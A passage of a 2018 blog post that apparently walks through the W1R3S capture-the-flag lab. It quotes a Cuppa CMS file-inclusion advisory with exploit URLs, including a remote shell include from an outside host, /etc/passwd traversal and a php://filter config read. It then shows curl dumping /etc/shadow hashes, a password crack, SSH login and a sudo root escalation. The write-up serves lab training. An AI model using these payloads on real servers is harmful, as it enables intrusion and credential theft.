+</span><span class='line'>        &lt;?php include($_REQUEST["urlConfig"]); ?&gt;
+</span><span class='line'>
+</span><span class='line'>-----------------------------------------------------------------------------
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>#####################################################
+</span><span class='line'>
+</span><span class='line'>DESCRIPTION
+</span><span class='line'>
+</span><span class='line'>#####################################################
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>#####################################################
+</span><span class='line'>
+</span><span class='line'>EXPLOIT
+</span><span class='line'>
+</span><span class='line'>#####################################################
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
+</span><span class='line'>
+</span><span class='line'>http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Moreover, We could access Configuration.php source code via PHPStream
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>For Example:
+</span><span class='line'>
+</span><span class='line'>-----------------------------------------------------------------------------
+</span><span class='line'>
+</span><span class='line'>http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
+</span><span class='line'>
+</span><span class='line'>-----------------------------------------------------------------------------
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Phase 4: LIVE RUN</h2>
+
+<p>I tried the LFI, but all I got was a blank page in return. So I attempted this with curl, and got served the <em>passwd</em> file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>curl http://192.168.145.134/administrator/alerts/alertConfigField.php --data-urlencode urlConfig=../../../../../../../../../etc/passwd
+</span><span class='line'>[...]
+</span><span class='line'>w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
+</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we have a valid user on the system and we can read arbitrary files. Because the root user was prepopulated in the installation page, I tried reading the <em>/etc/shadow</em> file and&hellip;succeeded!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
+</span><span class='line'>www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
+</span><span class='line'>w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That was a lucky break! I put the hashes for root and w1r3s in a file to be cracked by John the Ripper and immediately got a password:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>john hashes.txt
+</span><span class='line'>Created directory: /root/.john
+</span><span class='line'>Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
+</span><span class='line'>Use the "--format=crypt" option to force loading these as that type instead
+</span><span class='line'>Using default input encoding: UTF-8
+</span><span class='line'>Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
+</span><span class='line'>Press 'q' or Ctrl-C to abort, almost any other key for status
+</span><span class='line'>computer         (w1r3s)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With this, I could SSH in.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ssh w1r3s@192.168.145.134
+</span><span class='line'>The authenticity of host '192.168.145.134 (192.168.145.134)' can't be established.
+</span><span class='line'>ECDSA key fingerprint is SHA256:/3N0PzPMqtXlj9QWJFMbCufh2W95JylZ/oF82NkAAto.
+</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
+</span><span class='line'>Warning: Permanently added '192.168.145.134' (ECDSA) to the list of known hosts.
+</span><span class='line'>----------------------
+</span><span class='line'>Think this is the way?
+</span><span class='line'>----------------------
+</span><span class='line'>Well,........possibly.
+</span><span class='line'>----------------------
+</span><span class='line'>w1r3s@192.168.145.134's password:
+</span><span class='line'>Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)
+</span><span class='line'>
+</span><span class='line'> * Documentation:  https://help.ubuntu.com
+</span><span class='line'> * Management:     https://landscape.canonical.com
+</span><span class='line'> * Support:        https://ubuntu.com/advantage
+</span><span class='line'>
+</span><span class='line'>227 packages can be updated.
+</span><span class='line'>11 updates are security updates.
+</span><span class='line'>
+</span><span class='line'>*** System restart required ***
+</span><span class='line'>.....You made it huh?....
+</span><span class='line'>Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35</span></code></pre></td></tr></table></div></figure>
+
+
+<p>One of the things I picked up from watching <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">Ippsec</a> videos was to check the sudo privileges early on:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo -l
+</span><span class='line'>sudo: unable to resolve host W1R3S
+</span><span class='line'>[sudo] password for w1r3s:
+</span><span class='line'>Matching Defaults entries for w1r3s on W1R3S:
+</span><span class='line'>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span><span class='line'>
+</span><span class='line'>User w1r3s may run the following commands on W1R3S:
+</span><span class='line'>    (ALL : ALL) ALL</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That tops the misconfiguration list! Our user has unlimited sudo privileges!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>w1r3s@W1R3S:~$ sudo /bin/bash
+</span><span class='line'>sudo: unable to resolve host W1R3S
+</span><span class='line'>root@W1R3S:~# ls /root
+</span><span class='line'>flag.txt
+</span><span class='line'>root@W1R3S:~# cat /root/flag.txt
+</span><span class='line'>-----------------------------------------------------------------------------------------
+</span><span class='line'>   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  
+</span><span class='line'>  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___|
+</span><span class='line'> | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \
+</span><span class='line'> | |__| |_| | |\  | |_| |  _ &lt;  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |
+</span><span class='line'>  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/
+</span><span class='line'>
+</span><span class='line'>-----------------------------------------------------------------------------------------
+</span><span class='line'>
+</span><span class='line'>                          .-----------------TTTT_-----_______
+</span><span class='line'>                        /''''''''''(______O] ----------____  \______/]_
+</span><span class='line'>     __...---'"""\_ --''   Q                               ___________@
+</span><span class='line'> |'''                   ._   _______________=---------"""""""
+</span><span class='line'> |                ..--''|   l L |_l   |
+</span><span class='line'> |          ..--''      .  /-___j '   '
+</span><span class='line'> |    ..--''           /  ,       '   '
+</span><span class='line'> |--''                /           `    \
+</span><span class='line'>                      L__'         \    -
+</span><span class='line'>                                    -    '-.
+</span><span class='line'>                                     '.    /
+</span><span class='line'>                                       '-./
+</span><span class='line'>
+</span><span class='line'>----------------------------------------------------------------------------------------
+</span><span class='line'>  YOU HAVE COMPLETED THE
+</span><span class='line'>               __      __  ______________________   _________
+</span><span class='line'>              /  \    /  \/_   \______   \_____  \ /   _____/
+</span><span class='line'>              \   \/\/   / |   ||       _/ _(__  &lt; \_____  \
+</span><span class='line'>               \        /  |   ||    |   \/       \/        \
+</span><span class='line'>                \__/\  /   |___||____|_  /______  /_______  /.INC
+</span><span class='line'>                     \/                \/       \/        \/        CHALLENGE, V 1.0
+</span><span class='line'>----------------------------------------------------------------------------------------
+</span><span class='line'>
+</span><span class='line'>CREATED BY SpecterWires
+</span><span class='line'>
+</span><span class='line'>----------------------------------------------------------------------------------------</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Phase 5: REPORT</h2>
+
+<p>The exploitation chain was as follows:</p>
+
+<ul>
+<li>enumeration revealed the Cuppa CMS directories</li>
+<li>Cuppa CMS was vulnerable to a LFI exploit</li>
+<li>due to the CMS being configured as root, it was possible to read the <em>/etc/shadow</em> file with the LFI</li>
+<li>hash was cracked for standard user <em>w1r3s</em></li>
+<li>the user had unlimited sudo privileges and elevating to root was achieved</li>
+</ul>
+
+
+<p>Until next time!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>_____________________________________
+</span><span class='line'>/ You'll never be the man your mother \
+</span><span class='line'>\ was!                                /
+</span><span class='line'>-------------------------------------
+</span><span class='line'>           \   ^__^
+</span><span class='line'>              \  (oo)\_______
+</span><span class='line'>                   (__)\       )\/\
+</span><span class='line'>                           ||----w |
+</span><span class='line'>                           ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2018-11-30T16:18:45+02:00" pubdate data-updated="true">Nov 30<span>th</span>, 2018</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2018/11/30/getting-in-the-w1r3s/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2018/11/30/getting-in-the-w1r3s/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2018/11/16/hackfest-2016-sedna/" title="Previous Post: Hackfest 2016: Sedna">&laquo; Hackfest 2016: Sedna</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>whoami</h1>
+  <p>switch (interests){<br>
+ case INFORMATION SECURITY:<br>
+Mostly offensive security, but trying to be well-rounded in everything;<br>
+case PYTHON:<br>
+Mainly security and sysadmin related scripting;<br>
+case LINUX:<br>
+Greetings from /dev/null;<br>
+case JAPANESE:<br>
+Language, anime, samurai;<br>
+case MARTIAL ARTS:<br>
+If it's fighting I like it;<br>
+case MILITARY SCIENCE:<br>
+Ancient, medieval, modern;<br>
+default: GAMING;}</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/11/30/getting-in-the-w1r3s/">Getting in the W1R3S</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/16/hackfest-2016-sedna/">Hackfest 2016: Sedna</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/11/social-engineering-expert-course-review/">Social Engineering Expert course review</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/11/10/take-the-spydersec-challenge/">Take the SpyderSec Challenge</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/10/26/all-your-64base-are-belong-to-us/">All your 64Base are belong to us</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'chousensha',
+            count: 5,
+            skip_forks: true,
+	    skip_repos: [ "chousensha.github.io" ],
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
+    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+  </ul>
+  
+    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
+  
+</section>
+
+<section>
+  <h1>Blogroll</h1>
+  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
+  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
+  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
+  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
+  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
+  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
+  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
+  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
+  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
+  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - chousensha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'coredumpoverflow';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://chousensha.github.io/blog/2018/11/30/getting-in-the-w1r3s/';
+        var disqus_url = 'http://chousensha.github.io/blog/2018/11/30/getting-in-the-w1r3s/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
